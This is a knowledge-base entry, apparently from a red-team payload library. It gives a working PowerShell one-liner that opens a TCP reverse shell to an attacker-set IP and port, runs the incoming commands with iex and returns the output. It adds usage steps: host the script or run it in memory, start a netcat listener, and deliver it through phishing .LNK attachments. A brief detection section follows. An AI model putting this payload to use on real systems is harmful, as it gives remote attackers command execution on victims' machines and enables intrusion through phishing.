---
id: cf40f593-0024-41e1-89ad-b32c5be8aef2
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - payload
  - powershell
validated: true
---

# PowerShell-TCP-Reverse-Shell-One-Liner

## Code

```powershell
$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Description

This is a one-liner PowerShell script that establishes a TCP reverse shell connection to an attacker-specified IP and port. It creates a socket, reads commands from the stream, executes them via Invoke-Expression (iex), and sends the output back, mimicking a full PowerShell prompt. It is compact for embedding in payloads or downloading via web clients.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | IP address of the attacker's listener | 10.10.10.100 |
| $ATTACKER_PORT | Port on which the attacker is listening (e.g., with netcat) | 4444 |

## Usage

Save this as a .ps1 file and host it on a web server, or execute it directly in memory. Start a listener on the attacker side (e.g., `nc -lvnp $ATTACKER_PORT`) before triggering the payload. Commonly delivered via phishing attachments like the .LNK file in related procedures. Substitute variables before use.

## Detection

- PowerShell Script Block Logging will capture the iex execution and command output.
- Network connections from PowerShell processes to external IPs on non-standard ports.
- AMSI (Antimalware Scan Interface) may flag the socket creation and iex usage if enabled.
- Process monitoring for powershell.exe spawning child processes or unusual network activity.

## Related

- [[procedures/Create-LNK-File-with-Custom-PowerShell-Payload]]
